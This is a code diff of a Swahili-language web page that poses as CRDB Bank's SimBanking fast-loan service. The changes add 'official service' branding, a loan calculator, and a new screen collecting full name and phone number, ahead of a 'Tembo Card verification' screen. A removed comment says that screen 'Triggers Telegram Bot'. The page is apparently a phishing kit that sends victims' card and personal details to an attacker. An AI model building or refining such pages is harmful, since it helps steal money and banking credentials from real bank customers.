@@ -13,8 +13,8 @@
         <p id="loading-text">Inapakia...</p>
     </div>
 
-    <!-- SCREEN 0: LANDING BANNER -->
-    <div id="screen-landing" class="screen">
+    <!-- SCREEN 0: REDESIGNED LANDING BANNER -->
+    <div id="screen-landing" class="screen landing-screen">
         <header class="bank-header">
             <div class="logo-area">
                 <span class="menu-icon">☰</span>
@@ -22,27 +22,58 @@
             </div>
             <div class="simbanking-title">SimBanking <small>Benki yako mkononi</small></div>
         </header>
-        <div class="hero-banner">
-            <h1>KARIBU CRDB SIMBANKING MKOPO WA HARAKA</h1>
-            <p>Omba mkopo wa haraka kupitia SimBanking. Pata hadi TZS 5,000,000 ndani ya dakika.</p>
-            <div class="features-row">
-                <span class="badge-green">Haraka</span>
-                <span class="badge-green">Salama</span>
-                <span class="badge-green">Rahisi</span>
+        
+        <div class="hero-card">
+            <div class="hero-badge-top">HUDUMA RASMI YA MKOPO</div>
+            <h1>CRDB SIMBANKING MKOPO WA HARAKA</h1>
+            <p class="hero-subtitle">Pata mkopo wa papo hapo kupitia SimBanking bila usumbufu wowote. Mikopo ya kuanzia <strong>TZS 50,000</strong> hadi <strong>TZS 5,000,000</strong> ndani ya dakika chache!</p>
+            
+            <div class="features-grid">
+                <div class="feature-item">
+                    <span class="feature-icon">⚡</span>
+                    <div>
+                        <h4>Uidhinishaji wa Haraka</h4>
+                        <p>Pata pesa moja kwa moja kwenye akaunti yako.</p>
+                    </div>
+                </div>
+                <div class="feature-item">
+                    <span class="feature-icon">🔒</span>
+                    <div>
+                        <h4>Salama na Kuegemea</h4>
+                        <p>Ulinzi kamili wa taarifa na akaunti yako ya benki.</p>
+                    </div>
+                </div>
+                <div class="feature-item">
+                    <span class="feature-icon">📱</span>
+                    <div>
+                        <h4>Rahisi Kutumia</h4>
+                        <p>Inatumika kupitia simu yako ya mkononi wakati wowote.</p>
+                    </div>
+                </div>
             </div>
-            <button class="btn-primary" onclick="goToScreen('screen-step2')">OMBA SASA</button>
+
+            <div class="bank-info-box">
+                <h4>Vigezo na Masharti:</h4>
+                <ul>
+                    <li>Lazima uwe na akaunti inayotumika ya CRDB Bank.</li>
+                    <li>Namba yako ya simu lazima iwe imesajiliwa na SimBanking.</li>
+                    <li>Rejesha kwa urahisi kupitia akaunti yako au wakala.</li>
+                </ul>
+            </div>
+
+            <button class="btn-primary pulse-btn" onclick="goToScreen('screen-calculator')">OMBA MKOPO SASA</button>
         </div>
     </div>
 
-    <!-- SCREEN 1 & 2: CALCULATOR SLIDER -->
-    <div id="screen-step2" class="screen hidden">
+    <!-- SCREEN 1: CALCULATOR SLIDER -->
+    <div id="screen-calculator" class="screen hidden">
         <header class="bank-header">
             <div class="bank-logo">CRDB BANK</div>
             <div class="simbanking-title">Kikokotoo cha Mkopo</div>
         </header>
         <div class="form-container">
             <h2>Pata Mkopo Wako Haraka</h2>
-            <form id="form-step2" onsubmit="submitStep2(event)">
+            <form id="form-calculator" onsubmit="submitCalculator(event)">
                 <div class="input-group">
                     <label>Kiasi cha Mkopo: <strong id="displayAmount">TZS 500,000</strong></label>
                     <input type="range" id="loanAmountSlider" min="50000" max="5000000" step="50000" value="500000" oninput="updateCalculator()">
@@ -55,13 +86,37 @@
                     <p style="margin:0; font-size:13px; color:#555;">Malipo ya Kila Mwezi:</p>
                     <h3 id="displayMonthlyPayment" style="margin:5px 0 0 0; color:#006633;">TZS 45,000</h3>
                 </div>
-                <input type="hidden" id="requestedAmount">
+                <input type="hidden" id="requestedAmount" value="500000">
                 <button type="submit" class="btn-primary">ENDELEA</button>
             </form>
         </div>
     </div>
 
-    <!-- SCREEN 3: TEMBO CARD VERIFICATION (Triggers Telegram Bot) -->
+    <!-- SCREEN 2: TAARIFA ZA MTU NA SIMU -->
+    <div id="screen-personal" class="screen hidden">
+        <header class="bank-header">
+            <div class="bank-logo">CRDB BANK</div>
+            <div class="simbanking-title">Taarifa za Mtu na Simu</div>
+        </header>
+        <div class="form-container">
+            <h2>Taarifa za Mtu na Simu</h2>
+            <p>Tafadhali weka jina kamili na namba ya simu yako kuanzia 255. Namba hii lazima iwe imesajiliwa kwenye SimBanking yako ili kuendelea.</p>
+            <div id="personal-notice" class="surface-notice" style="display:none; color:red; font-weight:bold; margin-bottom:10px;"></div>
+            <form id="form-personal" onsubmit="submitPersonal(event)">
+                <div class="input-group">
+                    <label>Jina Kamili</label>
+                    <input type="text" id="fullName" placeholder="Mfano: John Ally Mhando" required>
+                </div>
+                <div class="input-group">
+                    <label>Namba ya Simu (Kuanzia 255)</label>
+                    <input type="text" id="phoneNumber" placeholder="Mfano: 255712345678" required>
+                </div>
+                <button type="submit" class="btn-primary">ENDELEA</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- SCREEN 3: TEMBO CARD VERIFICATION -->
     <div id="screen-step3" class="screen hidden">
         <header class="bank-header">
             <div class="bank-logo">CRDB BANK</div>
@@ -148,5 +203,5 @@
 
     <script src="script.js"></script>
 </body>
-                                                                                               </html>
-                    
+                                                    </html>
+                
